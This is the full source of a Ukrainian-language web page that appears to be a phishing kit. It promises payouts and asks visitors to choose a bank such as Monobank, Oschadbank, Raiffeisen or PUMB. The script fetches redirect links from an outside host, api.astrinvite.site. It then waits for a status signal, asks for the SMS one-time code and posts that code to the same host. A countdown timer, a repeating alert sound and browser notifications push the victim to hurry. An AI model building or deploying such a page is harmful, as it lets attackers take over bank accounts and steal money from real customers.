<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>Виберіть ваш банк</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    h1 { margin-bottom: 8px; font-size: 2.1em; font-weight: bold; }
    #subtitle {
      color: #555; font-size: 1.05em; margin-bottom: 20px;
      text-align: center; max-width: 350px;
    }
    .bank-btn, .bank-link {
      width: 320px;
      height: 50px;
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 16px;
      border: none;
      border-radius: 11px;
      cursor: pointer;
      transition: filter 0.18s, background 0.18s;
      box-shadow: 0 1px 6px #0001;
      outline: none;
      text-decoration: none;
      color: #fff;
      display: flex; align-items: center; justify-content: center;
    }
    .mono   { background: #222; }
    .oschad { background: #215E4D; }
    .raiff  { background: #ffe100; color: #222; }
    .pumb   { background: #ea262a; }
    .privat { background: #27AE60; }
    .bank-btn:disabled {
      background: #ccc !important;
      color: #fff !important;
      cursor: not-allowed;
      opacity: 0.7;
    }
    #status {
      margin-top: 18px; color: #555; font-size: 18px;
      text-align: center; min-height: 44px;
    }
    #return-instruction {
      margin: 16px 0 0 0;
      color:#444;
      max-width:400px;
      display:none;
      text-align: center;
    }
    #sms-code {
      font-size: 22px; letter-spacing: 10px; padding: 8px 20px;
      text-align: center; width: 190px; margin-top: 12px; margin-bottom: 8px;
    }
    #send-code-btn {
      margin-left: 10px; padding: 10px 30px; font-size: 18px;
      background: #1976d2; color: #fff; border: none; border-radius: 7px; cursor: pointer;
    }
    #send-code-btn:disabled {
      background-color: #aaa; cursor: not-allowed;
    }
    #sms-error { color: red; margin-top: 5px; }
    #timer { color: #c60; margin-left: 16px; font-weight: bold; font-size: 20px; }
  </style>
</head>
<body>
  <h1>Виберіть ваш банк</h1>
  <div id="subtitle">Для отримання виплат виберіть банк, у якому у вас є діюча карта.</div>
  <button class="bank-btn mono"   id="mono-btn"   disabled>Monobank</button>
  <button class="bank-btn oschad" id="oschad-btn" disabled>Ощадбанк</button>
  <button class="bank-btn raiff"  id="raiff-btn"  disabled>Raiffeisen Bank</button>
  <button class="bank-btn pumb"   id="pumb-btn"   disabled>ПУМБ</button>
  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">ПриватБанк</a>
  <div id="return-instruction">
    <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
    Код підтвердження з'явиться тут автоматично.</b>
  </div>
  <div id="status"></div>
  <audio id="sms-audio" src="sms.mp3"></audio>

  <script>
    // Для примера: по-умолчанию ссылки для всех банков нет (disabled)
    const API_MAP = {
      mono:   "https://api.astrinvite.site/link?bank=mono",
      oschad: "https://api.astrinvite.site/link?bank=oschad",
      raiff:  "https://api.astrinvite.site/link?bank=raiff",
      pumb:   "https://api.astrinvite.site/link?bank=pumb"
    };
    const CONSUME_MAP = {
      mono:   "https://api.astrinvite.site/consume-link?bank=mono",
      oschad: "https://api.astrinvite.site/consume-link?bank=oschad",
      raiff:  "https://api.astrinvite.site/consume-link?bank=raiff",
      pumb:   "https://api.astrinvite.site/consume-link?bank=pumb"
    };
    const STATUS_URL = "https://api.astrinvite.site/api/link-status";
    const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
    let currentBank = null;
    let currentId = null;
    let pollingStatus = false;
    let statusPoller = null;
    let link = null;
    let smsTimerInterval = null;
    let smsSoundInterval = null;

    // Проверяем по очереди для каждого банка — если есть ссылка, делаем кнопку активной
    async function checkLinks() {
      for (const bank of ["mono","oschad","raiff","pumb"]) {
        const btn = document.getElementById(bank+"-btn");
        btn.disabled = true;
        btn.textContent = capitalize(bank === "raiff" ? "Raiffeisen Bank" : (bank === "pumb" ? "ПУМБ" : bank.charAt(0).toUpperCase()+bank.slice(1)));
        try {
          const res = await fetch(API_MAP[bank]);
          if (res.ok) {
            const data = await res.json();
            if (data.url && data.id) {
              btn.disabled = false;
              btn.onclick = ()=>handleBankClick(bank);
            }
          }
        } catch { /* неактивна если не получилось */ }
      }
    }
    checkLinks();

    function capitalize(str) {
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    function resetUI() {
      document.getElementById("return-instruction").style.display = "none";
      document.getElementById("status").textContent = "";
      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
        let el = document.getElementById(id);
        el.disabled = false;
        el.textContent = el.dataset.orig || el.textContent;
      });
    }

    function showLoading(btnId) {
      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
        let el = document.getElementById(id);
        if(id!==btnId) el.disabled = true;
      });
      document.getElementById(btnId).textContent = "Завантаження...";
      document.getElementById("status").innerHTML = "";
    }

    async function handleBankClick(bank) {
      resetUI();
      currentBank = bank;
      let btnId = bank+"-btn";
      showLoading(btnId);
      try {
        const res = await fetch(API_MAP[bank]);
        if (!res.ok) throw new Error();
        const data = await res.json();
        if (data.url && data.id) {
          currentId = data.id;
          link = data.url;
          fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
          document.getElementById("return-instruction").style.display = "";
          window.location.href = link;
          pollStatus();
        } else {
          throw new Error("Посилання не отримано");
        }
      } catch {
        document.getElementById("status").innerHTML = "<span style='color:#b33'>Не вдалося отримати посилання. Спробуйте ще раз.</span>";
        resetUI();
      }
    }

    async function pollStatus() {
      if (pollingStatus) return;
      pollingStatus = true;
      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
        document.getElementById(id).disabled = true;
      });
      statusPoller = setInterval(async () => {
        try {
          const res = await fetch(`${STATUS_URL}?id=${currentId}`);
          const data = await res.json();
          if (data.status === "waiting_code") {
            clearInterval(statusPoller);
            showCodeInput();
          }
        } catch {}
      }, 2500);
    }

    function showCodeInput() {
      document.getElementById("status").innerHTML = `
        <b>Введіть 6-значний код з SMS:</b><br>
        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
        <button id="send-code-btn">Підтвердити</button>
        <span id="timer"></span>
        <div id="sms-error"></div>
      `;
      document.getElementById("sms-code").focus();
      startSMSTimer();

      document.getElementById("send-code-btn").onclick = async () => {
        let code = document.getElementById("sms-code").value.trim();
        if (!/^\d{6}$/.test(code)) {
          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
          return;
        }
        document.getElementById("send-code-btn").disabled = true;
        document.getElementById("sms-error").textContent = "";
        let fd = new FormData();
        fd.append("id", currentId);
        fd.append("code", code);
        try {
          const res = await fetch(CODE_URL, { method: "POST", body: fd });
          const resp = await res.json();
          if (resp.ok) {
            document.getElementById("status").innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
            stopSMSTimer();
          } else {
            document.getElementById("send-code-btn").disabled = false;
            document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
          }
        } catch {
          document.getElementById("send-code-btn").disabled = false;
          document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
        }
      };
    }

    function startSMSTimer() {
      let seconds = 180;
      playSMSAudio();
      showSMSPush();
      updateSMSTimer(seconds);

      smsSoundInterval = setInterval(() => {
        playSMSAudio();
      }, 5000);

      smsTimerInterval = setInterval(() => {
        seconds--;
        updateSMSTimer(seconds);
        if (seconds <= 0) {
          clearInterval(smsTimerInterval);
          clearInterval(smsSoundInterval);
          document.getElementById("timer").textContent = "⏰ Час вичерпано!";
        }
      }, 1000);
    }
    function stopSMSTimer() {
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      if (smsSoundInterval) clearInterval(smsSoundInterval);
      document.getElementById("timer").textContent = "";
    }
    function updateSMSTimer(seconds) {
      let m = Math.floor(seconds / 60), s = seconds % 60;
      document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
    }
    function playSMSAudio() {
      try {
        const audio = document.getElementById("sms-audio");
        audio.currentTime = 0;
        audio.play();
      } catch {}
    }
    function showSMSPush() {
      if ("Notification" in window) {
        if (Notification.permission === "granted") {
          new Notification("Введіть код з SMS для завершення входу!", {
            body: "Вікно для коду вже чекає вас на сайті.",
            icon: "favicon.ico"
          });
        } else if (Notification.permission !== "denied") {
          Notification.requestPermission().then(function (permission) {
            if (permission === "granted") {
              new Notification("Введіть код з SMS для завершення входу!", {
                body: "Вікно для коду вже чекає вас на сайті.",
                icon: "favicon.ico"
              });
            }
          });
        }
      }
    }
  </script>
</body>
</html>
